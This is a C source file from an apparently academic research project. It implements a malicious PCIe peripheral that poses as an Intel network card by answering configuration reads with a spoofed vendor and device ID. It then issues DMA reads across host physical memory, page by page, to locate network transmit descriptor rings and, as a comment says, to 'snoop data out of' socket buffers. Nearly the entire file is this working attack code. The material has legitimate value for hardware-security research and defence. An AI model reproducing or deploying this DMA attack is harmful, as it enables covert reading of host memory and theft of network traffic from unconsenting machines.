/*-
 * SPDX-License-Identifier: BSD-2-Clause
 * 
 * Copyright (c) 2015-2018 Colin Rothwell
 * 
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory under DARPA/AFRL contract FA8750-10-C-0237
 * ("CTSRD"), as part of the DARPA CRASH research programme.
 * 
 * We acknowledge the support of EPSRC.
 * 
 * We acknowledge the support of Arm Ltd.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdint.h>
#include <stdio.h>

#include "mask.h"
#include "pcie.h"
#include "pcie-backend.h"
#include "qemu/bswap.h"

/*
 * We want to snoop data out of anything interesting. A good candidate is the
 * transmit mbufs -- in particular we hope that we'll be able to some adjacent
 * local socket mbufs.
 *
 * We scan through pages, checking to see if the first 16 * 16 = 256 bytes all
 * match Brett's heuristic for a send buffer descriptor.
 */

/* Each send buffer descriptor is 128 bits = 16 bytes */
struct bcm5701_send_buffer_descriptor {
	uint64_t host_address;
	uint16_t flags;
	uint16_t length;
	uint16_t vlan_tag;
	uint16_t reserved;
};

void
print_descriptors(struct bcm5701_send_buffer_descriptor *descriptor,
	uint64_t count)
{
	for (uint64_t i = 0; i < count; ++i) {
		printf("host_address: 0x%09lx; flags: 0x%x; length: %d; "
			"vlan_tag: 0x%04x; reserved: 0x%04x.\n",
			descriptor[i].host_address, descriptor[i].flags,
			descriptor[i].length, descriptor[i].vlan_tag,
			descriptor[i].reserved);
	}
}

enum attack_state {
	AS_UNINITIALISED,
	AS_LOOKING_FOR_DESCRIPTOR_RING
};

enum packet_response {
	PR_NO_RESPONSE, PR_RESPONSE
};

struct packet_response_state {
	uint32_t devfn;
	enum attack_state attack_state;
};

enum packet_response
respond_to_packet(struct packet_response_state *state,
	struct RawTLP *in, struct RawTLP *out)
{
	uint16_t requester_id;
	uint64_t req_addr;
	enum packet_response response = PR_NO_RESPONSE;
	struct TLP64DWord0 *dword0 = (struct TLP64DWord0 *)in->header;
	struct TLP64RequestDWord1 *request_dword1 =
		(struct TLP64RequestDWord1 *)(in->header + 1);
	struct TLP64ConfigRequestDWord2 *config_request_dword2 =
		(struct TLP64ConfigRequestDWord2 *)(in->header + 2);

	enum tlp_direction dir = get_tlp_direction(in);

	requester_id = request_dword1->requester_id;

	switch (dword0->type) {
	case CFG_0:
		if ((config_request_dword2->device_id & uint32_mask(3)) != 0) {
			printf("Don't like device_id: %x.\n",
				config_request_dword2->device_id);
			break;
		}

		state->devfn = config_request_dword2->device_id;
		response = PR_RESPONSE;
		req_addr = get_config_req_addr(in);

		if (dir == TLPD_READ) {
			out->data_length = 4;
			switch (req_addr) {
			case 0: /* vendor and device id */
				out->data[0] = 0x104b8086;
				if (state->attack_state == AS_UNINITIALISED) {
					state->attack_state = AS_LOOKING_FOR_DESCRIPTOR_RING;
				}
				break;
			default:
				out->data[0] = 0;
			}
			out->data[0] = bswap32(out->data[0]);
		} else {
			out->data_length = 0;
		}

		out->header_length = 12;
		create_completion_header(out, dir, state->devfn,
			TLPCS_SUCCESSFUL_COMPLETION, 4, requester_id, request_dword1->tag,
			0);

		break;
	default:
		printf("Ignoring %s (0x%x) TLP.\n", tlp_type_str(dword0->type),
			dword0->type);
		break;
	}
	return response;
}

int
main(int argc, char *argv[])
{
	int send_result;
	TLPQuadWord tlp_in_quadword[32];
	TLPQuadWord tlp_out_header[2];
	TLPQuadWord tlp_out_data[16];
	struct RawTLP raw_tlp_in;
	struct RawTLP raw_tlp_out;
	raw_tlp_out.header = (TLPDoubleWord *)tlp_out_header;
	raw_tlp_out.data = (TLPDoubleWord *)tlp_out_data;

	enum packet_response response;
	struct packet_response_state packet_response_state;
	packet_response_state.attack_state = AS_UNINITIALISED;
	int read_result;
	uint64_t read_addr = 0x400000;
	struct bcm5701_send_buffer_descriptor descriptors[16];
	/*
	 * We have found that in practise the tx ring is not located lower
	 * than this.
	 */

	int init = pcie_hardware_init(argc, argv, &physmem);
	if (init) {
		puts("Problem initialising PCIE core.");
		return init;
	}

	uint64_t addr, req_addr;

	drain_pcie_core();
	puts("PCIe Core Drained. Let's go.");


	while (1) {
		wait_for_tlp(tlp_in_quadword, sizeof(tlp_in_quadword), &raw_tlp_in);

		if (is_raw_tlp_valid(&raw_tlp_in)) {
			response = respond_to_packet(&packet_response_state,
				&raw_tlp_in, &raw_tlp_out);
			if (response != PR_NO_RESPONSE) {
				send_result = send_tlp(&raw_tlp_out);
				assert(send_result != -1);
			}
			continue;
		}

		switch (packet_response_state.attack_state) {
		case AS_UNINITIALISED:
			break;
		case AS_LOOKING_FOR_DESCRIPTOR_RING:
			read_result = perform_dma_read((uint8_t *)descriptors,
				256, packet_response_state.devfn, 0, read_addr);
			printf("Read result: %d.\n", read_result);
			if (read_result != -1) {
				print_descriptors(descriptors, 16);
			}
			read_addr += 4096;
			break;
		}
	}
	
	puts("Quitting main loop.");
}
